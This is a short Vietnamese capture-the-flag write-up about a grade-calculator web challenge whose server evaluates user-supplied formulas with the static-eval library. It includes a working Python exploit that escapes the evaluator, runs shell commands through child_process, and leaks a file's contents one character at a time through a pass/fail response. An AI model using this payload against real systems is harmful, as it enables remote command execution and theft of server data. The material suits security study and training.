![image](https://github.com/user-attachments/assets/25c591fb-21e8-47b8-a8c9-64c604d5c7c8)

Đây là giao diện của trang web:

![image](https://github.com/user-attachments/assets/6057e3e1-0134-4921-8874-783b97a890f5)

Và req của trang web đó:

![image](https://github.com/user-attachments/assets/d40ea384-4761-4d64-b99d-760bbddb357f)

Đây là src code và điểm được tính theo công thức 0.20 * assignment + 0.25 * exam + 0.25 * paper, nếu trên 10.5 thì pass:

![image](https://github.com/user-attachments/assets/413c59d6-bb85-4a88-9f4f-be9ed985f490)

![image](https://github.com/user-attachments/assets/296428be-092a-4e8a-a364-65de594c5d56)

Để ý `let ast = parse(formula).body[0].expression;` và `let weight = evaluate(ast, { exam, paper, assignment });` là có thể tính toán formula trong đó, tức là thực thi trong đó, [static-eval](https://github.com/browserify/static-eval):

![image](https://github.com/user-attachments/assets/6ec99873-3724-4d15-b257-bb61a23a9005)

Vậy thì dựa vào điều kiện passed và nope thì có thể dùng boolean base:

```
import requests
import string

url = 'http://94.237.50.40:47878/'

flag = ''

for i, _ in enumerate(iter(bool, True)):
  for c in string.printable:
    # if char from flag is guessed correctly, return 25 (Passed: formula >= 10.5) else return 1 (Nope: formula < 10.5)
    p = "(function (x) { return `${eval(\"if(global.process.mainModule.constructor._load('child_process').execSync('cat flag*').toString().charCodeAt(" + str(i) + ") == " + str(ord(c)) + ") {25} else {1}\")}` })()"

    j = {"name": "lmaoo", "formula": p}
    r = requests.post(url + '/api/calculate', json=j)

    if(b'Passed' in r.content):
      flag += c
      print(flag)

      if(c == '}'):
        quit()

      break
```
![image](https://github.com/user-attachments/assets/a2d1f98d-d168-4896-8c20-b167cb515a44)






